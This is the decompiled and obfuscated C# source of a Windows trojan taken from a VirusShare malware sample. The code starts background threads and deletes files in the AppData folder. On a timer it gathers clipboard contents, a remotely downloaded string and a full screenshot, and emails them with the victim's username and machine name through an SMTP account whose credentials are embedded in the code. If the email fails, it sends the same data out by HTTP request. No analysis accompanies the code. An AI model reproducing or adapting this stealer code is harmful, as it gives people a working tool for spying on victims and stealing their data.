// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 1, Version=8.93.47.49, Culture=neutral, PublicKeyToken=null
// MVID: DFA8ED2E-5616-44FF-892B-A77949B35FF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.mxlc-0e45041763d0a87cf14d630d0ef61ca2fbfdc37f1c8a9944dd0c3cfd1cf0aa8a.exe

using \u0002;
using \u0006;
using \u000E;
using \u000F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.MyServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

namespace \u000E
{
  internal class \u0001
  {
    public static string \u0001;
    public static string \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;
    public static string \u0007;
    public static string \u0008;
    public static string \u000E;
    public static string \u000F;
    public static string \u0010;
    public static string \u0011;
    public static string \u0012;
    public static string \u0013;
    public static string \u0014;
    public static string \u0015;
    public static int \u0001;
    public static string \u0016;
    public static string \u0017;
    public static string \u0018;
    public static string \u0019;
    public static string \u001A;
    public static string \u001B;
    public static string \u001C;
    public static int \u0002;
    public static string \u001D;
    public static string \u001E;
    public static int \u0003;
    public static \u0001 \u0001;
    public static Thread \u0001;
    public static Thread \u0002;
    public static Thread \u0003;
    public static Thread \u0004;
    public static Thread \u0005;
    public static Thread \u0006;
    public static Thread \u0007;
    public static Thread \u0008;

    static \u0001()
    {
      try
      {
        \u0001.\u0012 = \u0003.\u0001(13);
        \u0001.\u0013 = \u0007.\u0001(\u0003.\u0001(14), \u0003.\u0001(55));
        \u0001.\u0014 = \u0007.\u0001(\u0003.\u0001(64), \u0003.\u0001(55));
        \u0001.\u0015 = \u0007.\u0001(\u0003.\u0001(81), \u0003.\u0001(55));
        \u0001.\u0001 = 587;
        \u0001.\u0016 = \u0007.\u0001(\u0003.\u0001(110), \u0003.\u0001(55));
        \u0001.\u0017 = \u0007.\u0001(\u0003.\u0001(123), \u0003.\u0001(55));
        \u0001.\u0018 = \u0007.\u0001(\u0003.\u0001(140), \u0003.\u0001(55));
        \u0001.\u0019 = \u0007.\u0001(\u0003.\u0001(149), \u0003.\u0001(55));
        \u0001.\u001A = \u0007.\u0001(\u0003.\u0001(149), \u0003.\u0001(55));
        \u0001.\u001B = \u0007.\u0001(\u0003.\u0001(162), \u0003.\u0001(55));
        \u0001.\u001C = \u0007.\u0001(\u0003.\u0001(162), \u0003.\u0001(55));
        \u0001.\u0002 = 120000;
        \u0001.\u001D = \u0003.\u0001(13);
        \u0001.\u001E = \u0003.\u0001(13);
        \u0001.\u0003 = 0;
        \u0001.\u0001 = new Thread(new ThreadStart(\u0001.\u0002));
        \u0001.\u0002 = new Thread(new ThreadStart(\u0007.\u0001));
        \u0001.\u0003 = new Thread(new ThreadStart(\u0007.\u0001));
        \u0001.\u0004 = new Thread(new ThreadStart(\u0007.\u0001));
        \u0001.\u0005 = new Thread(new ThreadStart(\u0007.\u0001));
        \u0001.\u0006 = new Thread(new ThreadStart(\u0007.\u0001));
        \u0001.\u0007 = new Thread(new ThreadStart(\u0007.\u0001));
        \u0001.\u0008 = new Thread(new ThreadStart(\u0007.\u0001));
      }
      catch (Exception ex)
      {
        \u0007.\u0001(ex);
        throw;
      }
    }

    [STAThread]
    public static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      IntPtr num1;
      string[] strArray1;
      IEnumerator<string> enumerator1;
      string path1;
      IEnumerator<string> enumerator2;
      string path2;
      string Left;
      try
      {
        if (!\u0007.\u0001())
          return;
        try
        {
          \u0007.\u0001();
          Process currentProcess = Process.GetCurrentProcess();
          num1 = new IntPtr(5);
          IntPtr num2 = num1;
          currentProcess.MinWorkingSet = num2;
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(175), \u0003.\u0001(55))))
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(175), \u0003.\u0001(55)));
          if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(216), \u0003.\u0001(55))))
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(216), \u0003.\u0001(55)));
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          try
          {
            FileSystemProxy fileSystem = \u0001.\u0001().FileSystem;
            string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(216), \u0003.\u0001(55));
            strArray1 = new string[1]{ \u0003.\u0001(261) };
            string[] strArray2 = strArray1;
            foreach (string file in fileSystem.GetFiles(directory, Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, strArray2))
            {
              path1 = file;
              System.IO.File.Delete(path1);
            }
          }
          finally
          {
            enumerator1?.Dispose();
          }
          try
          {
            foreach (string file in \u0001.\u0001().FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(270), \u0003.\u0001(55))))
            {
              path2 = file;
              System.IO.File.Delete(path2);
            }
          }
          finally
          {
            enumerator2?.Dispose();
          }
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0001.\u0004.IsBackground = true;
          \u0001.\u0004.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        *(int*) voidPtr = 0;
        while (true)
        {
          *(int*) ((IntPtr) voidPtr + 4) = 1;
          try
          {
            if (*(int*) voidPtr == 3)
              Application.Restart();
            \u0001.\u0001 = new \u0001(\u0001.\u001E);
            \u0007.\u0001();
            break;
          }
          catch (Exception ex)
          {
            int lErl = *(int*) ((IntPtr) voidPtr + 4);
            ProjectData.SetProjectError(ex, lErl);
            *(int*) voidPtr = checked (*(int*) voidPtr + 1);
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          \u0001.\u0001.IsBackground = true;
          \u0001.\u0001.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          Left = \u0001.\u0018;
          if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(311), \u0003.\u0001(55)), false) == 0)
          {
            int num3 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.None);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(324), \u0003.\u0001(55)), false) == 0)
          {
            int num4 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(341), \u0003.\u0001(55)), false) == 0)
          {
            int num5 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(366), \u0003.\u0001(55)), false) == 0)
          {
            int num6 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(379), \u0003.\u0001(55)), false) == 0)
          {
            int num7 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(392), \u0003.\u0001(55)), false) == 0)
          {
            int num8 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Question);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(409), \u0003.\u0001(55)), false) == 0)
          {
            int num9 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(422), \u0003.\u0001(55)), false) == 0)
          {
            int num10 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          }
          else if (Operators.CompareString(Left, \u0007.\u0001(\u0003.\u0001(439), \u0003.\u0001(55)), false) == 0)
          {
            int num11 = (int) MessageBox.Show(\u0001.\u001A, \u0001.\u0019, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          }
          else
          {
            int num12 = (int) MessageBox.Show(\u0007.\u0001(\u0003.\u0001(464), \u0003.\u0001(55)), \u0007.\u0001(\u0003.\u0001(594), \u0003.\u0001(55)), MessageBoxButtons.OK, MessageBoxIcon.Hand);
          }
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0007.\u0001();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          do
          {
            \u0001.\u0002.IsBackground = true;
          }
          while (false);
          \u0001.\u0002.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(623), \u0003.\u0001(55)), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(672), \u0003.\u0001(55)), true);
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0001.\u0005.IsBackground = true;
          \u0001.\u0005.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0001.\u0006.IsBackground = true;
          \u0001.\u0006.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0001.\u0007.IsBackground = true;
          \u0001.\u0007.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0007.\u0001();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0001.\u0008.IsBackground = true;
          \u0001.\u0008.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0001.\u0003.IsBackground = true;
          \u0001.\u0003.Start();
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
        Process.GetCurrentProcess().WaitForExit();
      }
      catch (Exception ex)
      {
        object[] objArray = new object[9]
        {
          (object) *(int*) voidPtr,
          (object) path1,
          (object) path2,
          (object) num1,
          (object) strArray1,
          (object) enumerator1,
          (object) enumerator2,
          (object) Left,
          (object) *(int*) ((IntPtr) voidPtr + 4)
        };
        \u0007.\u0001(ex, objArray);
      }
    }

    public static unsafe void \u0002()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      string[] strArray1;
      string str1;
      WebClient webClient;
      string str2;
      Rectangle bounds;
      Bitmap bitmap1;
      Graphics graphics;
      Bitmap bitmap2;
      MailMessage message;
      MailMessage mailMessage;
      Attachment attachment;
      SmtpClient smtpClient1;
      SmtpClient smtpClient2;
      string str3;
      HttpWebResponse response;
      try
      {
        str1 = \u0003.\u0001(13);
        while (true)
        {
          Thread.Sleep(\u0001.\u0002);
          str1 = \u0003.\u0001(13);
          str2 = \u0003.\u0001(13);
          try
          {
            string[] strArray2 = new string[7];
            if (true)
              goto label_5;
label_4:
            strArray1[0] = \u0007.\u0001(\u0003.\u0001(745), \u0003.\u0001(55));
            strArray1[1] = Environment.NewLine;
            strArray1[2] = Environment.NewLine;
            strArray1[3] = \u0001.\u0001().Clipboard.GetText();
            strArray1[4] = Environment.NewLine;
            strArray1[5] = Environment.NewLine;
            strArray1[6] = \u0007.\u0001(\u0003.\u0001(866), \u0003.\u0001(55));
            str1 = string.Concat(strArray1);
            goto label_7;
label_5:
            strArray1 = strArray2;
            goto label_4;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
label_7:
          *(double*) voidPtr = 0.2;
          \u0007.\u0001(ref *(double*) voidPtr);
          try
          {
            webClient = new WebClient();
            strArray1 = new string[7]
            {
              \u0007.\u0001(\u0003.\u0001(866), \u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine,
              webClient.DownloadString(\u0007.\u0001(\u0003.\u0001(987), \u0003.\u0001(55))),
              Environment.NewLine,
              Environment.NewLine,
              \u0007.\u0001(\u0003.\u0001(1076), \u0003.\u0001(55))
            };
            str2 = string.Concat(strArray1);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            str2 = \u0003.\u0001(13);
            ProjectData.ClearProjectError();
          }
          *(double*) voidPtr = 1.0;
          \u0007.\u0001(ref *(double*) voidPtr);
          try
          {
            if (Operators.CompareString(\u0001.\u001B, \u0007.\u0001(\u0003.\u0001(1197), \u0003.\u0001(55)), false) == 0)
            {
              bounds = Screen.PrimaryScreen.Bounds;
              bitmap1 = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
              graphics = Graphics.FromImage((Image) bitmap1);
              graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
              bitmap2 = bitmap1;
              bitmap2.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(1210), \u0003.\u0001(55)) + \u0001.\u0003.ToString() + \u0007.\u0001(\u0003.\u0001(1267), \u0003.\u0001(55)));
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          *(double*) voidPtr = 0.3;
          \u0007.\u0001(ref *(double*) voidPtr);
          try
          {
            if (Operators.CompareString(\u0001.\u001E, \u0003.\u0001(13), false) != 0)
            {
              strArray1 = new string[10]
              {
                \u0007.\u0001(\u0003.\u0001(1280), \u0003.\u0001(55)),
                Environment.NewLine,
                Environment.NewLine,
                \u0001.\u001E,
                Environment.NewLine,
                Environment.NewLine,
                str2,
                Environment.NewLine,
                Environment.NewLine,
                str1
              };
              \u0001.\u001D = string.Concat(strArray1);
              *(int*) ((IntPtr) voidPtr + 8) = 0;
              try
              {
                message = new MailMessage();
                mailMessage = message;
                mailMessage.From = new MailAddress(\u0001.\u0013);
                mailMessage.To.Add(\u0001.\u0013);
                mailMessage.Subject = \u0007.\u0001(\u0003.\u0001(1438), \u0003.\u0001(55)) + Environment.UserName.ToString() + \u0007.\u0001(\u0003.\u0001(1479), \u0003.\u0001(55)) + Environment.MachineName.ToString();
                mailMessage.Body = \u0001.\u001D;
                try
                {
                  if (Operators.CompareString(\u0001.\u001B, \u0007.\u0001(\u0003.\u0001(1197), \u0003.\u0001(55)), false) == 0)
                  {
                    attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u0003.\u0001(1210), \u0003.\u0001(55)) + \u0001.\u0003.ToString() + \u0007.\u0001(\u0003.\u0001(1267), \u0003.\u0001(55)));
                    mailMessage.Attachments.Add(attachment);
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                mailMessage = (MailMessage) null;
                smtpClient1 = new SmtpClient(\u0001.\u0015);
                smtpClient2 = smtpClient1;
                smtpClient2.Port = \u0001.\u0001;
                smtpClient2.EnableSsl = true;
                smtpClient2.Credentials = (ICredentialsByHost) new NetworkCredential(\u0001.\u0013, \u0001.\u0014);
                smtpClient2.Send(message);
                smtpClient2 = (SmtpClient) null;
              }
              catch (Exception ex1)
              {
                ProjectData.SetProjectError(ex1);
                try
                {
                  str3 = \u0007.\u0001(\u0003.\u0001(1488), \u0003.\u0001(55));
                  strArray1 = new string[9]
                  {
                    str3,
                    \u0003.\u0001(1581),
                    \u0001.\u0013,
                    \u0003.\u0001(1590),
                    Strings.Replace(\u0007.\u0001(\u0003.\u0001(1438), \u0003.\u0001(55)) + Environment.UserName.ToString() + \u0007.\u0001(\u0003.\u0001(1479), \u0003.\u0001(55)) + Environment.MachineName.ToString(), \u0003.\u0001(1603), \u0003.\u0001(1608)),
                    \u0003.\u0001(1613),
                    Strings.Replace(\u0001.\u001D, \u0003.\u0001(1603), \u0003.\u0001(1608)),
                    \u0003.\u0001(1626),
                    \u0001.\u0013
                  };
                  response = (HttpWebResponse) WebRequest.Create(string.Concat(strArray1)).GetResponse();
                }
                catch (Exception ex2)
                {
                  ProjectData.SetProjectError(ex2);
                  ProjectData.ClearProjectError();
                }
                ProjectData.ClearProjectError();
              }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          \u0001.\u001D = \u0003.\u0001(13);
          \u0001.\u001E = \u0003.\u0001(13);
          \u0001.\u0012 = \u0003.\u0001(13);
          checked { ++\u0001.\u0003; }
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[17]
        {
          (object) str1,
          (object) str2,
          (object) webClient,
          (object) bitmap2,
          (object) bitmap1,
          (object) graphics,
          (object) bounds,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) smtpClient1,
          (object) message,
          (object) attachment,
          (object) str3,
          (object) response,
          (object) strArray1,
          (object) *(double*) voidPtr,
          (object) mailMessage,
          (object) smtpClient2
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }
  }
}
